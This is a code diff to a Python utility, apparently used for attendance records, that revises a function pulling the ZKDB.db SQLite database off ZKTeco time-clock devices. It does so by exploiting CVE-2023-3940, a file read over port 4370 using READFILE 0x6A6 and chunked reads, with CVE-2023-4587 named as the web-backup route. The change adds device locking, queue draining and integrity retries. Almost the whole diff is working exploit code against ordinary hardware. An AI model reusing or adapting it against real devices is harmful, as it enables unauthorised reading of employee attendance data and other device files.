@@ -1356,104 +1356,149 @@ def _attlog_web_candidates(web_ip, device_ip=None):
     return out
 
 
-def _attlog_download_zkdb_via_protocol(device_ip, out_path, timeout_s=60):
-    """Download ZKDB.db from ZK device via protocol READFILE (0x6A6) - CVE-2023-3940.
+def _attlog_download_zkdb_via_protocol(device_ip, out_path, timeout_s=60, progress_cb=None):
+    """Download ZKDB.db from ZK device via protocol - CVE-2023-3940.
 
     Use this as FALLBACK when web backup (CVE-2023-4587) is not reachable.
     Path: /mnt/mtdblock/data/ZKDB.db (confirmed on X628 PRO FW 6.60).
     Returns the SQLite data bytes; raises RuntimeError on failure.
 
-    Note: if device is busy writing ATTLOG during download, the file may be
-    partially written -> SQLite 'database disk image is malformed'. We retry up
-    to 3 times with 1.5s sleep + integrity_check before giving up.
+    v2.0.13 - PROPER PROTOCOL FLOW:
+    The naive approach (parse raw socket as stream after READFILE 0x6A6) was WRONG
+    and only captured ~7.1MB of the 7.6MB file (missing ~474 pages at end).
+
+    CORRECT FLOW (per pyzk's __read_chunk + ZK protocol spec):
+      1. CMD_READFILE 0x6A6 - load file into device buffer (returns PREPARE_DATA 1500)
+      2. Loop CMD_READ_CHUNK 0x5E0 (1504) with (start_offset, chunk_size) until file
+         fully read. Each call returns ~65472 bytes of payload.
+
+    ROBUST BUSY-DEVICE HANDLING:
+    - disable_device() locks screen so NV cannot trigger new ATTLOG writes
+    - refresh_data() + get_attendance() drain in-memory queue
+    - 8s wait for firmware's internal SQLite writer to commit in-flight transactions
+    - If integrity_check fails, retry up to 5 times
     """
     from zk import ZK, const
-    from struct import unpack
-    import socket
     import sqlite3 as _sqlite3
     import time as _time
     last_err = None
-    for attempt in range(3):
+    MAX_CHUNK = 0xFFC0  # 65472 bytes - pyzk's MAX_CHUNK for TCP
+    TARGET_SIZE = 7_700_000  # ~7.7MB target (real file is 7,599,104 bytes)
+    for outer in range(5):
+        ref_count = None
         try:
-            zk = ZK(device_ip, port=4370, timeout=15, password=0)
+            zk = ZK(device_ip, port=4370, timeout=20, password=0)
             conn = zk.connect()
         except Exception as e:
             raise RuntimeError('connect failed: {}'.format(str(e)[:80]))
         if not conn:
             raise RuntimeError('connect returned None')
         try:
+            if progress_cb:
+                progress_cb('🔒 [{}/5] Lock + drain + wait...'.format(outer + 1))
             try:
                 conn.disable_device()
             except Exception:
                 pass
-            # Send FREE_DATA first (clear any leftover buffers)
+            # Tell firmware to refresh data (might flush queue)
+            for cmd in (getattr(const, 'CMD_REFRESHDATA', 1013),
+                        getattr(const, 'CMD_REFRESHOPTION', 1014)):
+                try:
+                    conn._ZK__send_command(cmd, b'', response_size=8)
+                except Exception:
+                    pass
+            # Drain in-memory ATTLOG queue
+            try:
+                att = conn.get_attendance()
+                ref_count = len(att) if att else 0
+                if progress_cb and outer == 0:
+                    progress_cb('  ✓ ref_count = {}'.format(ref_count))
+            except Exception:
+                pass
+            # Wait for firmware's SQLite writer to commit in-flight transactions
+            if progress_cb and outer == 0:
+                progress_cb('  ⏳ Wait 8s cho firmware flush SQLite...')
+            _time.sleep(8)
+            # Clear buffer
             try:
                 conn._ZK__send_command(const.CMD_FREE_DATA, b'')
             except Exception:
                 pass
-            _time.sleep(0.4)
-            # Send READFILE (0x6A6) with full path
+            _time.sleep(0.3)
+            # STEP 1: Load file into device buffer via READFILE 0x6A6
             path = b'/mnt/mtdblock/data/ZKDB.db\x00'
             try:
-                conn._ZK__send_command(0x6A6, path, response_size=1024)
+                r = conn._ZK__send_command(0x6A6, path, response_size=1024)
+                if not r.get('status'):
+                    last_err = 'READFILE rejected: {}'.format(r)
+                    continue
             except Exception as e:
                 last_err = 'READFILE send failed: {}'.format(str(e)[:80])
                 continue
-            # Read chunks from raw socket
-            sock = conn._ZK__sock
-            sock.settimeout(min(15, timeout_s))
-            total = b''
-            chunks = 0
-            start = _time.time()
-            while _time.time() - start < timeout_s:
-                try:
-                    chunk = sock.recv(65536)
-                    if not chunk:
+            # STEP 2: Loop __read_chunk to read full file (CRITICAL FIX v2.0.13)
+            all_data = b''
+            i = 0
+            t_start = _time.time()
+            try:
+                while len(all_data) < TARGET_SIZE:
+                    if _time.time() - t_start > timeout_s:
+                        last_err = 'chunk read timeout after {} bytes'.format(len(all_data))
                         break
-                    if len(chunk) >= 16:
-                        top1, top2, tcp_len = unpack('<HHI', chunk[:8])
-                        zk_cmd = unpack('<H', chunk[8:10])[0]
-                        body = chunk[16:16 + (tcp_len - 8)] if tcp_len > 8 else b''
-                        total += body
-                        chunks += 1
-                        # ACK_OK or final response -> stop
-                        if zk_cmd in (0x07D0, 0x07D1, 2000, 2001):
-                            break
-                    else:
-                        if chunks > 0:
-                            break
-                except socket.timeout:
-                    break
-                except Exception:
-                    break
-            if not total or total[:15] != b'SQLite format 3':
-                last_err = 'not SQLite magic (got {} bytes)'.format(len(total))
+                    start = i * MAX_CHUNK
+                    chunk = conn._ZK__read_chunk(start, MAX_CHUNK)
+                    if not chunk:
+                        # No more data
+                        break
+                    all_data += chunk
+                    if progress_cb and i % 20 == 0:
+                        progress_cb('    📥 {}/{} chunks ({:.2f}MB)'.format(
+                            i, 120, len(all_data)/1024/1024))
+                    i += 1
+                    if i > 200:  # safety cap
+                        break
+            except Exception as e:
+                err_str = str(e)[:80]
+                if 'can\'t read chunk' in err_str:
+                    # Normal end-of-file
+                    pass
+                else:
+                    last_err = 'read_chunk err: {}'.format(err_str)
+                    continue
+            if progress_cb:
+                progress_cb('  📦 Read {} chunks = {:.2f}MB'.format(
+                    i, len(all_data)/1024/1024))
+            if not all_data or all_data[:15] != b'SQLite format 3':
+                last_err = 'not SQLite magic ({} bytes)'.format(len(all_data))
                 continue
-            # Save to disk
+            # Save and verify integrity
             with open(out_path, 'wb') as f:
-                f.write(total)
-            # Verify SQLite integrity (catches "database disk image is malformed")
+                f.write(all_data)
             try:
                 db = _sqlite3.connect(out_path)
                 cur = db.cursor()
-                # PRAGMA integrity_check returns 'ok' on success, errors otherwise
                 ick = cur.execute('PRAGMA integrity_check').fetchone()
                 if not ick or ick[0] != 'ok':
-                    last_err = 'SQLite integrity_check fail: {}'.format(ick)
                     db.close()
-                    if attempt < 2:
-                        _time.sleep(1.5)
-                        continue
-                    raise RuntimeError(last_err)
+                    last_err = 'SQLite integrity_check fail: {}'.format(ick)
+                    if progress_cb:
+                        progress_cb('  ✗ integrity_check fail: {}'.format(ick))
+                    continue
                 cnt = cur.execute('SELECT COUNT(*) FROM ATT_LOG').fetchone()[0]
                 db.close()
-                return total  # OK!
+                # Sanity: cnt should be >= ref_count
+                if ref_count is not None and cnt < ref_count:
+                    last_err = 'SQLite cnt={} < ref_count={}'.format(cnt, ref_count)
+                    if progress_cb:
+                        progress_cb('  ✗ count mismatch: SQLite={} < ref={}'.format(cnt, ref_count))
+                    continue
+                if progress_cb:
+                    progress_cb('  ✅ OK! SQLite ATTLOG={} (ref={})'.format(cnt, ref_count))
+                return all_data  # SUCCESS!
             except _sqlite3.DatabaseError as e:
                 last_err = 'SQLite corrupted: {}'.format(str(e)[:100])
-                if attempt < 2:
-                    _time.sleep(1.5)
-                    continue
-                raise RuntimeError(last_err)
+                if progress_cb:
+                    progress_cb('  ✗ SQLite corrupted: {}'.format(str(e)[:60]))
+                continue
         finally:
             try:
                 conn.enable_device()
@@ -1463,7 +1508,9 @@ def _attlog_download_zkdb_via_protocol(device_ip, out_path, timeout_s=60):
                 conn.disconnect()
             except Exception:
                 pass
-    raise RuntimeError('Protocol download fail after 3 retries: {}'.format(last_err or 'unknown'))
+            if outer < 4:
+                _time.sleep(2)
+    raise RuntimeError('Protocol download fail after 5 attempts: {}'.format(last_err or 'unknown'))
 
 
 def _attlog_download_zkdb_with_fallback(web_candidates, out_path, timeout_s=8, progress_cb=None, device_ip=None):
@@ -1498,13 +1545,14 @@ def _attlog_download_zkdb_with_fallback(web_candidates, out_path, timeout_s=8, p
     if device_ip:
         if progress_cb:
             progress_cb('🔌 Protocol: dang thu {} port 4370 (CVE-2023-3940)...'.format(device_ip))
+            progress_cb('⚠ May 3 sẽ bị LOCK ~30-60s để refresh ATTLOG queue, NV không chấm công được trong lúc này')
         try:
-            data = _attlog_download_zkdb_via_protocol(device_ip, out_path, timeout_s=60)
+            data = _attlog_download_zkdb_via_protocol(device_ip, out_path, timeout_s=60, progress_cb=progress_cb)
             if progress_cb:
                 progress_cb('✅ Protocol {} OK ({:,} bytes)'.format(device_ip, len(data)))
             return data, 'protocol:' + device_ip
         except Exception as e:
-            err_short = str(e)[:60]
+            err_short = str(e)[:80]
             attempts.append('zk://{}→{}'.format(device_ip, err_short))
             print('[attlog_download_fallback] protocol {} failed: {}'.format(device_ip, e), flush=True)
             if progress_cb:
